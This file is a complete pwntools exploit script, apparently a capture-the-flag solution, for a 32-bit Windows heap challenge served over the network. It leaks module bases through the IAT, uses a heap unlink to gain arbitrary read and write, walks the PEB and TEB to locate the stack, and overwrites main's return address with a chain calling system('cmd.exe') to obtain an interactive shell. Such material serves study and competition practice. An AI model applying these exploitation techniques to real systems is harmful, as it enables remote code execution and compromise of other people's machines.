#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *

# context.log_level = 'debug'
context.arch = 'i386'
sh = remote('192.168.3.129', 10001)

def add(size, content):
    sh.sendlineafter('choice?\r\n', '1')
    sh.sendlineafter('sword?\r\n', str(size))
    sh.sendafter('Name it!\r\n', content)

def destroy(index):
    sh.sendlineafter('choice?\r\n', '2')
    sh.sendlineafter('destroy?\r\n', str(index))

def polish(index, size, content):
    sh.sendlineafter('choice?\r\n', '3')
    sh.sendlineafter('polish?\r\n', str(index))
    sh.sendlineafter('time?\r\n', str(size))
    sh.sendafter('again : \r\n', content)

def check(index):
    sh.sendlineafter('choice?\r\n', '4')
    sh.sendlineafter('check?\r\n', str(index))

sh.recvuntil('gift : 0x')
image_base = int(sh.recvuntil('\r\n'), 16) - 0x001090
log.info('image_base: ' + hex(image_base))

ptr_addr = image_base + 0x4370
g_inuse_addr = image_base + 0x0043BC

for i in range(6):
    add(0x58, '\n')

destroy(2)

# leak free heap header
free_heap_header = ''
while(len(free_heap_header) < 8):
    head_length = len(free_heap_header)
    polish(1, 0x58 + head_length, 'a' * (0x58 + head_length) + '\n')
    check(1)
    sh.recvuntil('a' * (0x58 + head_length))
    free_heap_header += sh.recvuntil('\r\n', drop=True) + '\0'

free_heap_header = free_heap_header[:8]
# recover
polish(1, 0x60, 'a' * 0x58 + free_heap_header + '\n')

#unlink
destroy(4)
polish(1, 0x58 + 8 + 8, 'b' * 0x58 + free_heap_header + p32(ptr_addr + 4) + p32(ptr_addr + 8) + '\n')
destroy(1)

sh.sendlineafter('choice?\r\n', '1337')
sh.sendlineafter('target?\r\n', str(g_inuse_addr + 2))
polish(2, 4, p32(ptr_addr + 12) + '\n')


# leak dll base addr
puts_iat = image_base + 0x0030C8 # ucrtbase.dll
Sleep_iat = image_base + 0x003008 # KERNEL32.dll

polish(2, 4, p32(puts_iat) + '\n')
check(3)
sh.recvuntil('Show : ')
result = sh.recvuntil('\r\n', drop=True)[:4]
ucrtbase_addr = u32(result) - 0xb89b0
log.success('ucrtbase_addr: ' + hex(ucrtbase_addr))

polish(2, 4, p32(Sleep_iat) + '\n')
check(3)
sh.recvuntil('Show : ')
result = sh.recvuntil('\r\n', drop=True)[:4]
KERNEL32_addr = u32(result) - 0x00021ab0
log.success('KERNEL32_addr: ' + hex(KERNEL32_addr))

NtCreateFile_iat = KERNEL32_addr + 0x000819bc

polish(2, 4, p32(NtCreateFile_iat) + '\n')
check(3)
sh.recvuntil('Show : ')
result = sh.recvuntil('\r\n', drop=True)[:4]
ntdll_addr = u32(result) - 0x709f0
log.success('ntdll_addr: ' + hex(ntdll_addr))


# leak PEB
ntdll_PedLdr_addr = ntdll_addr + 0x120c40
log.success('ntdll_PedLdr_addr: ' + hex(ntdll_PedLdr_addr))
polish(2, 4, p32(ntdll_PedLdr_addr - 52) + '\n')
check(3)
sh.recvuntil('Show : ')
result = sh.recvuntil('\r\n', drop=True)[:4]
Peb_addr = u32(result.ljust(4, '\0')) - 0x21c
log.success('Peb_addr: ' + hex(Peb_addr))

# leak StackBase
babyheap_Teb_addr = Peb_addr + 0x3000
log.success('babyheap_Teb_addr: ' + hex(babyheap_Teb_addr))
result = ''
while(len(result) < 4):
    result_length = len(result)
    polish(2, 4, p32(babyheap_Teb_addr + 4 + result_length) + '\n')
    check(3)
    sh.recvuntil('Show : ')
    result += sh.recvuntil('\r\n', drop=True) + '\0'

StackBase = u32(result[:4])
log.success('StackBase: ' + hex(StackBase))


# leak main_ret_addr
polish(2, 4, p32(g_inuse_addr + 3) + '\n')
polish(3, 4, p8(1) * 4 + '\n')

main_ret_content = image_base + 0x193b
log.success('main_ret_content: ' + hex(main_ret_content))
# search stack
log.info('Start searching stack, it will take a long time.')
main_ret_addr = 0
for addr in range(StackBase - 0x1000, StackBase, 0x10)[::-1]:
    if(main_ret_addr == 0):
        polish(2, 0x10, p32(addr + 12) + p32(addr + 8) + p32(addr + 4) + p32(addr) + '\n')
        for i in range(3, 3 + 4):
            check(i)
            sh.recvuntil('Show : ')
            result = sh.recvuntil('\r\n', drop=True)[:4]
            content = u32(result.ljust(4, '\0'))
            if(content == main_ret_content):
                main_ret_addr = addr + (3-(i-3)) * 4
                break

log.success('main_ret_addr: ' + hex(main_ret_addr))

polish(2, 0x10, p32(main_ret_addr) + 'cmd.exe\0\n')

layout = [
    ucrtbase_addr + 0x000efd80, # system
    image_base + 0x21AF, # exit
    ptr_addr + 4 * 4,
    0,
]
payload = flat(layout)
polish(3, len(payload), payload + '\n')

sh.sendlineafter('choice?\r\n', '5')

sh.interactive()

